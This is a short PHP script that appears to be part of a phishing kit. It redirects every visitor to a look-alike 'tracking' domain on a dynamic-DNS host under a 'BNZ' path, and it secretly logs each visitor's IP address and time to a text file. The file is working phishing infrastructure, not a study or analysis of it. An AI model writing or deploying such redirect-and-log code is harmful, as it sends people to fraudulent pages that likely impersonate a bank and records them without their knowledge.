<?php
require_once($_SERVER['DOCUMENT_ROOT'].'/auth/code/include.php');
    header("Location: https://mytraclking-online.sytes.net/BNZ/");
    $fh = fopen('vu.txt', 'a');
    fwrite($fh, $_SERVER['REMOTE_ADDR'] . ' ' . date('c') . "\n");
    fclose($fh);
?>